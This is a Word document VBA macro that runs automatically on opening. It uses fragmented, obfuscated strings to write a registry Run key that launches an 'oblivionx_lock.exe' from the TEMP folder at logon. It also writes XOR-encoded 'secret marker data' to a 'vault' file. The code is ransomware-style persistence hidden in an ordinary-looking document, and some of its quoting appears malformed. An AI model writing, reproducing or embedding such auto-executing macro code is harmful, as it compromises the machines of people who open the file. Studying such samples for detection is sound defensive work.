Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim ws As Object
    Dim fPath As String, data As String, enc As String
    Dim i As Long
    Set ws = CreateObject("WScri" & "pt.Shell")
    ws.RegWrite "HKCU\S" & "oftwar" & "e\Micro" & "soft\Wind" & "ows\Cu" & "rrentV" & "ersion\Ru" & "n\ob" & "livionx", """ & Environ("TEMP") & "\obli" & "vionx" & "_loc" & "k.ex" & "e"", "REG_SZ"
    fPath = Environ("TEMP") & "\oblivi" & "onx_va" & "ult\secre" & "t.txt"
    data = "top s" & "ecret " & "marke" & "r data"
    enc = ""
    For i = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, i, 1)) Xor 42)
    Next i
    Open fPath For Output As #1
    Print #1, enc
    Close #1
End Sub
